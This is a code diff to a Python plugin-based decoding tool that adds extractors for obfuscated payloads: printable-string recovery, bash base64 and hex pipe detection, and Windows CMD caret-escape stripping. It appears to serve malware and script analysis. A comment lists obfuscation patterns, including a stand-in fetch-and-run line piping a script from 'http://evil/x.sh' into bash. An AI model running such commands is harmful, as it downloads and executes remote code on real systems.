@@ -121,7 +121,7 @@ def _b64_decode_lenient(data: bytes, urlsafe: bool = False) -> bytes:
 
 
 def _detect_base64(data: bytes) -> float:
-    if len(data) < 16:
+    if len(data) < 8:
         return 0.0
     # Consider the longest CONTIGUOUS run of base64 alphabet chars.
     # This prevents matching strings like "powershell.exe -e JABv..." where
@@ -129,7 +129,7 @@ def _detect_base64(data: bytes) -> float:
     # extract-encoded-command plugin first for those cases.
     text = data.decode("latin-1", errors="ignore")
     best = ""
-    for m in re.finditer(r"[A-Za-z0-9+/=]{16,}", text):
+    for m in re.finditer(r"[A-Za-z0-9+/=]{8,}", text):
         if len(m.group(0)) > len(best):
             best = m.group(0)
     if not best:
@@ -137,6 +137,11 @@ def _detect_base64(data: bytes) -> float:
     # The b64 blob must dominate the input (>= 92% of non-space chars)
     non_space_len = len(re.sub(r"\s", "", text))
     if non_space_len == 0 or len(best) / non_space_len < 0.92:
+        return 0.0
+    # Short candidates (< 16 chars) MUST have proper == padding to reduce
+    # false positives on plain words that happen to be b64-alphabet
+    # (e.g. `Password` → wouldn't decode to anything meaningful).
+    if len(best) < 16 and not best.endswith("="):
         return 0.0
     conf = 0.85
     if len(best) % 4 == 0:
@@ -439,7 +444,7 @@ register(Plugin(
 # PowerShell -EncodedCommand extractor (auto-triggered pre-processor)
 # ---------------------------------------------------------------------------
 _PS_ENC_RE = re.compile(
-    r"(?:powershell|pwsh)(?:\.exe)?[^\r\n]*?\s-e(?:c|nc|ncodedcommand)?\s+([A-Za-z0-9+/=]{16,})",
+    r"(?:powershell|pwsh)(?:\.exe)?[^\r\n]*?\s-e(?:c|nc|ncodedcommand)?\s+([A-Za-z0-9+/=]{8,})",
     re.IGNORECASE,
 )
 
@@ -464,6 +469,173 @@ register(Plugin(
     description="Find `powershell -e/-enc/-EncodedCommand <base64>` and extract just the payload.",
     run=_extract_ps_encoded,
     detect=_detect_ps_encoded,
+))
+
+
+# ---------------------------------------------------------------------------
+# String extractor — surface embedded UTF-16LE / ASCII strings from noisy
+# binary blobs (dumps, corrupted base64 payloads, mixed-encoding output).
+# ---------------------------------------------------------------------------
+# Real-world use case: PowerShell -Enc payloads sometimes have a few chars
+# of junk prefix (leftover from truncation or obfuscation) that break clean
+# UTF-16LE decoding. `strings(1)`-style extraction recovers the readable
+# content anyway.
+_PRINTABLE_UTF16LE_RUN = re.compile(rb"(?:[\x20-\x7e]\x00){6,}")
+_PRINTABLE_ASCII_RUN = re.compile(rb"[\x20-\x7e\t\r\n]{8,}")
+
+
+def _detect_strings(data: bytes) -> float:
+    if len(data) < 8:
+        return 0.0
+    non_printable = sum(1 for b in data if b not in (9, 10, 13) and (b < 32 or b > 126))
+    ratio_noise = non_printable / len(data)
+    if ratio_noise < 0.15:
+        # Mostly clean text already — let text-oriented decoders handle it.
+        return 0.0
+    utf16_runs = _PRINTABLE_UTF16LE_RUN.findall(data)
+    ascii_runs = _PRINTABLE_ASCII_RUN.findall(data)
+    utf16_len = sum(len(r) for r in utf16_runs)
+    ascii_len = sum(len(r) for r in ascii_runs)
+    coverage = (utf16_len + ascii_len) / len(data)
+    if coverage < 0.10:
+        return 0.0
+    # Higher confidence when there's a lot of embedded readable content —
+    # clear the 0.7 auto-decode floor.
+    return min(0.9, 0.72 + coverage * 0.4)
+
+
+def _extract_strings(data: bytes, params: Dict[str, Any]) -> bytes:
+    parts: list[str] = []
+    for m in _PRINTABLE_UTF16LE_RUN.finditer(data):
+        try:
+            s = m.group(0).decode("utf-16le")
+            if s.strip():
+                parts.append(s)
+        except Exception:
+            pass
+    for m in _PRINTABLE_ASCII_RUN.finditer(data):
+        try:
+            s = m.group(0).decode("ascii")
+            if s.strip() and s not in parts:
+                parts.append(s)
+        except Exception:
+            pass
+    if not parts:
+        return data
+    return "\n".join(parts).encode("utf-8", errors="replace")
+
+
+register(Plugin(
+    id="extract-strings",
+    name="Extract Printable Strings (UTF-16LE + ASCII)",
+    category="Extractors",
+    description=(
+        "Recover human-readable strings from noisy/binary payloads — like the "
+        "`strings(1)` tool. Handles UTF-16LE (Windows/PowerShell) and ASCII. "
+        "Auto-fires when base64 or similar decoding produces mixed printable + "
+        "non-printable output (e.g. AMSI-bypass payloads with obfuscated prefixes)."
+    ),
+    run=_extract_strings,
+    detect=_detect_strings,
+))
+
+
+# ---------------------------------------------------------------------------
+# Bash / *nix shell obfuscation extractors
+# ---------------------------------------------------------------------------
+# Common patterns:
+#   echo <b64> | base64 -d | bash
+#   echo <b64> | base64 --decode
+#   echo <hex> | xxd -r -p
+#   printf '<hex>' | ...
+#   $(echo <b64> | base64 -d)
+#   bash -c "$(curl -s http://evil/x.sh)"
+_BASH_B64_RE = re.compile(
+    r"""(?:echo\s+["']?|printf\s+["'])([A-Za-z0-9+/=]{20,})["']?\s*\|\s*(?:openssl\s+enc\s+-d\s+-base64|base64\s+(?:-d|--decode|-D))""",
+    re.IGNORECASE,
+)
+_BASH_HEX_RE = re.compile(
+    r"""(?:echo\s+["']?|printf\s+["'])([0-9a-fA-F\s]{20,})["']?\s*\|\s*xxd\s+-r\s+-p""",
+    re.IGNORECASE,
+)
+
+
+def _detect_bash_b64(data: bytes) -> float:
+    text = data.decode("utf-8", errors="ignore")
+    return 0.95 if _BASH_B64_RE.search(text) else 0.0
+
+
+def _extract_bash_b64(data: bytes, params: Dict[str, Any]) -> bytes:
+    text = data.decode("utf-8", errors="replace")
+    m = _BASH_B64_RE.search(text)
+    if m:
+        return m.group(1).encode("ascii")
+    return data
+
+
+def _detect_bash_hex(data: bytes) -> float:
+    text = data.decode("utf-8", errors="ignore")
+    return 0.95 if _BASH_HEX_RE.search(text) else 0.0
+
+
+def _extract_bash_hex(data: bytes, params: Dict[str, Any]) -> bytes:
+    text = data.decode("utf-8", errors="replace")
+    m = _BASH_HEX_RE.search(text)
+    if m:
+        return re.sub(r"\s+", "", m.group(1)).encode("ascii")
+    return data
+
+
+register(Plugin(
+    id="extract-bash-base64-pipe",
+    name="Extract bash `base64 -d` piped payload",
+    category="Extractors",
+    description="Find `echo <b64> | base64 -d` (or `openssl enc -d -base64`) and extract the base64 blob.",
+    run=_extract_bash_b64,
+    detect=_detect_bash_b64,
+))
+
+register(Plugin(
+    id="extract-bash-hex-pipe",
+    name="Extract bash `xxd -r -p` piped payload",
+    category="Extractors",
+    description="Find `echo <hex> | xxd -r -p` and extract the hex blob for downstream hex-decode.",
+    run=_extract_bash_hex,
+    detect=_detect_bash_hex,
+))
+
+
+# ---------------------------------------------------------------------------
+# Windows CMD caret-escape stripper (`ec^ho ex^ec` obfuscation)
+# ---------------------------------------------------------------------------
+def _detect_cmd_caret(data: bytes) -> float:
+    text = data.decode("utf-8", errors="ignore")
+    # Only fire when carets appear INSIDE what look like tokens (letter^letter),
+    # not just as bit-shift operators or in strings.
+    matches = len(re.findall(r"[A-Za-z]\^[A-Za-z]", text))
+    if matches < 2:
+        return 0.0
+    # 2+ intra-token carets ⇒ this is CMD obfuscation.
+    return min(0.9, 0.75 + matches * 0.02)
+
+
+def _extract_cmd_caret(data: bytes, params: Dict[str, Any]) -> bytes:
+    text = data.decode("utf-8", errors="replace")
+    # Strip carets that are between two letters/digits (CMD's escape char).
+    # Preserve `^^` (literal caret) as `^`.
+    text = re.sub(r"\^\^", "\x00CARET\x00", text)
+    text = re.sub(r"(?<=[A-Za-z0-9])\^(?=[A-Za-z0-9])", "", text)
+    text = text.replace("\x00CARET\x00", "^")
+    return text.encode("utf-8", errors="replace")
+
+
+register(Plugin(
+    id="cmd-strip-carets",
+    name="Strip CMD Caret Escapes",
+    category="Deobfuscation",
+    description="Remove `^` intra-token escapes used in Windows CMD to bypass keyword detection (e.g. `p^o^w^e^r^shell`).",
+    run=_extract_cmd_caret,
+    detect=_detect_cmd_caret,
 ))
 
 
